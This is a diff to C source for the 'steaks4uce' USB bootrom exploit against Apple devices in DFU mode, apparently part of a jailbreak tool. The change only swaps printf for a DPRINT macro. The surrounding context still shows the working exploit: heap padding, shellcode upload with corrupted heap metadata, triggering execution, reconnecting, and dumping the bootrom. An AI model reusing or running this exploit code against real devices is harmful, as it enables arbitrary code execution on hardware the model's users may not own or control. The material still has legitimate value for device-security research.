@@ -109,26 +109,26 @@ int steaks4uce()
 		0xfc, 0xd7, 0x02, 0x22,	// 0x34: BK : exception_irq() LR in stack
 	};
 
-	printf("Executing steaks4uce exploit ...\n");
-	printf("Reseting usb counters.\n");
+	DPRINT("Executing steaks4uce exploit ...\n");
+	DPRINT("Reseting usb counters.\n");
 	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
 	if (ret < 0) {
-		printf("Failed to reset usb counters.\n");
+		DPRINT("Failed to reset usb counters.\n");
 		return -1;
 	}
 
-	printf("Padding to 0x23800...\n");
+	DPRINT("Padding to 0x23800...\n");
 	memset(data, 0, 0x800);
 	for (i = 0; i < 0x23800; i += 0x800) {
 		ret =
 		    irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800,
 					   1000);
 		if (ret < 0) {
-			printf("Failed to push data to the device.\n");
+			DPRINT("Failed to push data to the device.\n");
 			return -1;
 		}
 	}
-	printf("Uploading shellcode.\n");
+	DPRINT("Uploading shellcode.\n");
 	memset(data, 0, 0x800);
 	if(dump_bootrom)
 		memcpy(data, steaks4uce_payload, sizeof(steaks4uce_payload));
@@ -137,14 +137,14 @@ int steaks4uce()
 		
 	ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
 	if (ret < 0) {
-		printf("Failed to upload shellcode.\n");
+		DPRINT("Failed to upload shellcode.\n");
 		return -1;
 	}
 
-	printf("Reseting usb counters.\n");
+	DPRINT("Reseting usb counters.\n");
 	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
 	if (ret < 0) {
-		printf("Failed to reset usb counters.\n");
+		DPRINT("Failed to reset usb counters.\n");
 		return -1;
 	}
 
@@ -164,23 +164,23 @@ int steaks4uce()
 	    irecv_control_transfer(client, 0x21, 1, 0, 0, data, send_size,
 				   1000);
 	if (ret < 0) {
-		printf("Failed to send steaks4uce to the device.\n");
+		DPRINT("Failed to send steaks4uce to the device.\n");
 		return -1;
 	}
 	ret =
 	    irecv_control_transfer(client, 0xA1, 1, 0, 0, data, send_size,
 				   1000);
 	if (ret < 0) {
-		printf("Failed to execute steaks4uce.\n");
+		DPRINT("Failed to execute steaks4uce.\n");
 		return -1;
 	}
-	printf("steaks4uce sent & executed successfully.\n");
+	DPRINT("steaks4uce sent & executed successfully.\n");
 
-	printf("Reconnecting to device\n");
+	DPRINT("Reconnecting to device\n");
 	client = irecv_reconnect(client, 2);
 	if (client == NULL) {
-		printf("%s\n", irecv_strerror(error));
-		printf("Unable to reconnect\n");
+		DPRINT("%s\n", irecv_strerror(error));
+		DPRINT("Unable to reconnect\n");
 		return -1;
 	}
 	
@@ -194,8 +194,8 @@ int steaks4uce()
 		
 		client = irecv_reconnect(client, 2);
 		if (client == NULL) {
-			printf("%s\n", irecv_strerror(error));
-			printf("Unable to reconnect\n");
+			DPRINT("%s\n", irecv_strerror(error));
+			DPRINT("Unable to reconnect\n");
 			return -1;
 		}
 		
@@ -205,10 +205,10 @@ int steaks4uce()
 				break;
 			fwrite(data, 1, 0x800, fp);
 			address += 0x800;
-			printf("Dumping 0x%08x\n", address);
+			DPRINT("Dumping 0x%08x\n", address);
 		} while(address < 0x10000);
 		
-		printf("dumped.\n");
+		DPRINT("dumped.\n");
 		exit(0);
 	}
 #endif
